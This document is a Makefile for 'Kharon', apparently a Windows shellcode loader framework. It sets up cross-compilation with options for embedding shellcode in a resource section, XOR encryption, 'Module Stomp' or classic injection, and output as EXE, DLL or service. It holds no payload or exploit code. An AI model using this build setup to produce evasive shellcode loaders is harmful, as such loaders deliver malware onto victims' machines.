NAME   := Kharon
BUILD_PATH ?= .
OBJ_PATH   := $(BUILD_PATH)/Bin

CCX64 := clang++ -target x86_64-w64-mingw32

FORMAT              ?= Undefined
SECTION             ?= Undefined
RSRC_ID             ?= Undefined
CUSTOM_SECTION_NAME ?= Undefined
ENCRYPTION_TYPE     ?= Undefined
XOR_KEY             ?= Undefined
INJECTION_TECHNIQUE ?= Undefined

CFLAGS := \
    -Os       \
    -mwindows \
    -nostdlib \
    -s

LIBS := \
    -lkernel32 \
    -ladvapi32 \
    -lntdll    \
    -lmsvcrt

DEFS := \
    -D XOR_KEY='$(XOR_KEY)'

# Shellcode Section 
ifeq ($(SECTION),rsrc)
    DEFS    += -D SHELLCODE_SECTION_LOCATION=SHELLCODE_SECTION_RSRC
    DEFS    += -D RSRC_ID=$(RSRC_ID)
    RES_OBJ := Include/shellcode.res
else
    DEFS    += -D SHELLCODE_SECTION_LOCATION=SHELLCODE_SECTION_OTHER
    RES_OBJ :=
endif

# Injection Technique 
ifeq ($(INJECTION_TECHNIQUE),Module Stomp)
    INJECTION_SRC := Source/Injection/Stomper.cc
    DEFS          += -D INJECTION_TECHNIQUE=INJECTION_TECHNIQUE_STOMPER
endif

ifeq ($(INJECTION_TECHNIQUE),Classic)
    INJECTION_SRC := Source/Injection/Classic.cc
    DEFS          += -D INJECTION_TECHNIQUE=INJECTION_TECHNIQUE_CLASSIC
endif

# Encryption Type
ifeq ($(ENCRYPTION_TYPE),xor)
    DEFS += -D ENCRYPTION_TYPE=ENCRYPTION_XOR
endif

ifeq ($(ENCRYPTION_TYPE),none)
    DEFS += -D ENCRYPTION_TYPE=ENCRYPTION_NONE
endif

# Format
ifeq ($(FORMAT),Exe)
    SRC    := Source/Main/Exe.cc
    OUT    := $(OBJ_PATH)/$(NAME).x64.exe
    XFLAGS := -Wl,-e,WinMain
endif

ifeq ($(FORMAT),Dll)
    SRC    := Source/Main/Dll.cc
    OUT    := $(OBJ_PATH)/$(NAME).x64.dll
    XFLAGS := -shared
endif

ifeq ($(FORMAT),Svc)
    SRC    := Source/Main/Svc.cc
    OUT    := $(OBJ_PATH)/$(NAME).x64.svc.exe
    XFLAGS := -Wl,-e,WinMain
endif

INC            := Include
ENTRY          := Source/Entry.cc
ENCRYPTION_SRC := Source/Encryption.cc

.PHONY: all exe dll svc build clean

all: build

exe:
	@ $(MAKE) FORMAT=Exe SECTION=$(SECTION) XOR_KEY='$(XOR_KEY)' INJECTION_TECHNIQUE=$(INJECTION_TECHNIQUE) ENCRYPTION_TYPE=$(ENCRYPTION_TYPE) build

dll:
	@ $(MAKE) FORMAT=Dll SECTION=$(SECTION) XOR_KEY='$(XOR_KEY)' INJECTION_TECHNIQUE=$(INJECTION_TECHNIQUE) ENCRYPTION_TYPE=$(ENCRYPTION_TYPE) build

svc:
	@ $(MAKE) FORMAT=Svc SECTION=$(SECTION) XOR_KEY='$(XOR_KEY)' INJECTION_TECHNIQUE=$(INJECTION_TECHNIQUE) ENCRYPTION_TYPE=$(ENCRYPTION_TYPE) build

build: $(OBJ_PATH)
	@ echo "SECTION           = '$(SECTION)'"
	@ echo "INJECTION         = '$(INJECTION_TECHNIQUE)'"
	@ echo "ENCRYPTION        = '$(ENCRYPTION_TYPE)'"
	@ echo "DEFS              = $(DEFS)"
	@ echo "RES_OBJ           = '$(RES_OBJ)'"
	@ echo "[*] Compiling $(FORMAT) x64..."
	@ $(CCX64)            \
	    -I $(INC)         \
	    -o $(OUT)         \
	    $(ENTRY)          \
	    $(SRC)            \
	    $(RES_OBJ)        \
	    $(INJECTION_SRC)  \
	    $(ENCRYPTION_SRC) \
	    $(CFLAGS)         \
	    $(DEFS)           \
	    $(XFLAGS)         \
	    $(LIBS)
	@ echo "[✓] Build completed: $(OUT)"

$(OBJ_PATH):
	@ mkdir -p $(OBJ_PATH)

clean:
	@ rm -f $(OBJ_PATH)/$(NAME).x64.exe      \
	        $(OBJ_PATH)/$(NAME).x64.dll      \
	        $(OBJ_PATH)/$(NAME).x64.svc.exe
	@ rm -f $(INC)/Shellcode.h
	@ rm -f $(INC)/shellcode.bin
	@ rm -f $(INC)/shellcode.rc
	@ rm -f $(INC)/shellcode.res
	@ echo "[✓] Cleanup completed"